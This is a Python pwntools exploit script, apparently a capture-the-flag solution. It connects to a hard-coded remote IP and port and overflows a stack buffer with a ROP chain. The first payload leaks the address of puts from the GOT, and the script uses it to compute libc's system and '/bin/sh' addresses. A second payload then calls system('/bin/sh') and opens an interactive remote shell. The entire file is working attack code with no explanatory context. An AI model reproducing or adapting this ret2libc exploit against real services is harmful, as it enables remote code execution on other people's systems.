# -*- coding:utf-8 -*-  

from pwn import *

r = remote("119.28.63.211",2332)
#r = remote("172.16.37.160", 4444)
context.log_level = "debug"

pop_rdi_ret = 0x0000000000400763
pop_rsi_r15_ret = 0x0000000000400761
puts_plt = 0x0000000000400500
puts_got = 0x0000000000601018
game_addr = 0x000000000040068E

def leak(addr):
	payload = "a"*0x40
	payload += "b"*8
	payload += p64(pop_rdi_ret)
	payload += p64(addr)
	payload += p64(puts_plt)
	payload += p64(game_addr)
	payload = payload.ljust(0xc8,"c")
	r.send(payload)
	print r.recvuntil("bye~")
	data = r.recv(8).replace("\n","")
	data = data.ljust(8,"\x00")
	return data

local_system_offset = 0x0000000000046590
local_puts_offset = 0x000000000006fd60
local_bin_sh_offset = 0x017c8c3

remote_system_offset = 0x0000000000468f0
remote_puts_offset = 0x0000000000070c70
remote_bin_sh_offset = 0x017dbc5

puts_addr = u64(leak(puts_got))
print "[*] puts addr:{0}".format(hex(puts_addr))
"""
read_addr = u64(leak(0x000000000601028))
print "[*] read addr:{0}".format(hex(read_addr))

system_addr = puts_addr - local_puts_offset + local_system_offset
bin_sh_addr = puts_addr - local_puts_offset + local_bin_sh_offset
"""
system_addr = puts_addr - remote_puts_offset + remote_system_offset
bin_sh_addr = puts_addr - remote_puts_offset + remote_bin_sh_offset

payload = "a"*0x40
payload += "b"*8
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
payload += p64(game_addr)
payload = payload.ljust(0xc8,"c")
r.send(payload)
r.interactive()